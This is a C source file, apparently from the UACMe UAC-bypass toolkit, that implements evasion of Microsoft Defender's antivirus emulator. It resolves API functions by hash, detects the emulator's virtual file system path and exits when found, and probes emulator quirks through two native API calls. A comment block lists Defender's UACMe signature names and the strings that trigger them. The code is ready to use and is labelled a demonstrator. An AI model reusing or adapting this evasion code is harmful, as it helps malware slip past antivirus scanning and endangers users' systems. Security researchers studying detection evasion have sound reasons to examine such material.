/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2020
*
*  TITLE:       WINDEFEND.C
*
*  VERSION:     3.50
*
*  DATE:        14 Sep 2020
*
*  MSE / Windows Defender anti-emulation part.
*
*  WARNING: Kernel32/ntdll only dependencies.
*
*  Short FAQ:
*
*  Q: Why this module included in UACMe,
*     I thought this is demonstrator tool not real malware?
*
*  A: WinDefender is a default AV software installed on every Windows
*     since Windows 8. Because some of the lazy malware authors copy-pasted
*     whole UACMe project in their crappiest malware WinDefender has
*     several signatures to detect UACMe and it components.
*     Example of WinDefend signature: Bampeass. We cannot be prevented by this
*     as this demonstrator must be running on newest Windows OS versions.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "shared.h"

#pragma warning(push)
#pragma warning(disable: 4055)
#pragma warning(disable: 4152)

/*

WD Signatures

Trojan:Win64/Bampeass.A

Triggers:
[ U C M ]   W u s a   f a i l e d   c o p y   H i b i k i
% t e m p % \ H i b i k i . d l l
E l e v a t i o n : A d m i n i s t r a t o r ! n e w : { 4 D 1 1 1 E 0 8 - C B F 7 - 4 f 1 2 - A 9 2 6 - 2 C 7 9 2 0 A F 5 2 F C }
U A C M e   i n j e c t e d ,   F u b u k i   a t   y o u r   s e r v i c e


Trojan:Win64/Bampeass.B

Triggers:
UACMe injected, Hibiki at your service.
ucmLoadCallback, dll load %ws, DllBase = %


Trojan:Win64/Bampeass.C

Triggers:
ucmLoadCallback, dll load %ws, DllBase = %p
UACMe injected, Hibiki at your service.
ucmLoadCallback, kernel32 base found


HackTool:Win64/UACMe.A!MSR

Triggers:
\REGISTRY\MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\UAC\COMAutoApprovalList
run /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup" /i
"UACMe main module
UAC is now disabled.\nYou must reboot your computer for the changes to take effect.
_FubukiProc4
UACMe v3.1.9.1905
\Software\KureND
ArisuTsuberuku
AkagiCompletionEvent
AkagiSharedSection

HackTool:Win32/Fubuki!MTB

Triggers:
AkagiSharedSection
system32\
_FubukiProc2
mmc.exe
\?\globalroot\systemroot\system32\sysprep\unbcl
CorBindToRuntimeEx
CreateUri

*/

DWORD wdxEmulatorAPIHashTable[] = {
    0x70CE7692,
    0xD4CE4554,
    0x7A99CFAE
};

PVOID wdxGetProcedureAddressByHash(
    _In_ PVOID MpClientBase,
    _In_ DWORD ProcedureHash);


/*
* wdxGetHashForString
*
* Purpose:
*
* Calculates specific hash for string.
*
*/
DWORD wdxGetHashForString(
    _In_ char *s
)
{
    DWORD h = 0;

    while (*s != 0) {
        h ^= *s;
        h = RotateLeft32(h, 3) + 1;
        s++;
    }

    return h;
}

/*
* wdxGetProcedureAddressByHash
*
* Purpose:
*
* Return pointer to function in MpClient from name hash value.
*
*/
PVOID wdxGetProcedureAddressByHash(
    _In_ PVOID ImageBase,
    _In_ DWORD ProcedureHash
)
{
    DWORD i;
    ULONG sz = 0;

    IMAGE_DOS_HEADER *DosHeader;
    IMAGE_EXPORT_DIRECTORY *Exports;
    PDWORD Names, Functions;
    PWORD Ordinals;

    DWORD_PTR FunctionPtr;

    DosHeader = (IMAGE_DOS_HEADER*)ImageBase;

    Exports = (IMAGE_EXPORT_DIRECTORY*)RtlImageDirectoryEntryToData(ImageBase, 
        TRUE,
        IMAGE_DIRECTORY_ENTRY_EXPORT, 
        &sz);

    if (Exports == NULL)
        return NULL;

    Names = (PDWORD)((PBYTE)DosHeader + Exports->AddressOfNames);
    Ordinals = (PWORD)((PBYTE)DosHeader + Exports->AddressOfNameOrdinals);
    Functions = (PDWORD)((PBYTE)DosHeader + Exports->AddressOfFunctions);

    for (i = 0; i < Exports->NumberOfNames; i++) {
        if (wdxGetHashForString((char *)((PBYTE)DosHeader + Names[i])) == ProcedureHash) {
            FunctionPtr = Functions[Ordinals[i]];
            return (PBYTE)ImageBase + FunctionPtr;
        }
    }

    return NULL;
}
/*
* wdCheckEmulatedVFS
*
* Purpose:
*
* Detect Microsoft Security Engine emulation by it own VFS artefact.
*
* Microsoft AV provides special emulated environment for scanned application where it
* fakes general system information, process environment structures/data to make sure
* API calls are transparent for scanned code. It also use simple Virtual File System
* allowing this AV track file system changes and if needed continue emulation on new target.
*
* This method implemented in commercial malware presumable since 2013.
*
*/
VOID wdCheckEmulatedVFS(
    VOID
)
{
    WCHAR szBuffer[MAX_PATH];
    WCHAR szMsEngVFS[12] = { L':', L'\\', L'm', L'y', L'a', L'p', L'p', L'.', L'e', L'x', L'e', 0 };

    RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
    GetModuleFileName(NULL, szBuffer, MAX_PATH);
    if (_strstri(szBuffer, szMsEngVFS) != NULL) {
        RtlExitUserProcess((UINT)0);
    }
}

/*
* wdIsEmulatorPresent
*
* Purpose:
*
* Detect MS emulator state.
*
*/
NTSTATUS wdIsEmulatorPresent(
    VOID)
{
    PCHAR ImageBase = NULL;

    IMAGE_DOS_HEADER *DosHeader;
    IMAGE_EXPORT_DIRECTORY *Exports;
    PDWORD Names;

    ULONG i, c, Hash, sz = 0;

    UNICODE_STRING usNtdll = RTL_CONSTANT_STRING(L"ntdll.dll");

    if (!NT_SUCCESS(LdrGetDllHandleEx(LDR_GET_DLL_HANDLE_EX_UNCHANGED_REFCOUNT,
        NULL, NULL, &usNtdll, &ImageBase)))
    {
        return STATUS_DLL_NOT_FOUND;
    }

    Exports = (IMAGE_EXPORT_DIRECTORY*)RtlImageDirectoryEntryToData(ImageBase, TRUE,
        IMAGE_DIRECTORY_ENTRY_EXPORT, &sz);

    if (Exports == NULL)
        return STATUS_INVALID_IMAGE_FORMAT;

    DosHeader = (IMAGE_DOS_HEADER*)ImageBase;
    Names = (PDWORD)((PBYTE)DosHeader + Exports->AddressOfNames);

    for (i = 0; i < Exports->NumberOfNames; i++) {
        Hash = wdxGetHashForString((char *)((PBYTE)DosHeader + Names[i]));
        for (c = 0; c < RTL_NUMBER_OF(wdxEmulatorAPIHashTable); c++) {
            if (Hash == wdxEmulatorAPIHashTable[c])
                return STATUS_NEEDS_REMEDIATION;
        }
    }

    return STATUS_NOT_SUPPORTED;
}

/*
* wdIsEmulatorPresent2
*
* Purpose:
*
* Detect MS emulator state 2.
*
* Microsoft AV defines virtual environment dlls loaded in runtime from VDM files.
* These fake libraries implement additional detection layer and come with a lot of
* predefined values.
*
*/
BOOLEAN wdIsEmulatorPresent2(
    VOID)
{   
    return NtIsProcessInJob(NtCurrentProcess(), UlongToHandle(10)) == 0x125;
}

/*
* wdIsEmulatorPresent3
*
* Purpose:
*
* Same as previous.
*
*/
BOOLEAN wdIsEmulatorPresent3(
    VOID)
{
    if (NT_SUCCESS(NtCompressKey(UlongToHandle(0xFFFF1234))))
        return TRUE;

    return FALSE;
}

#pragma warning(pop)
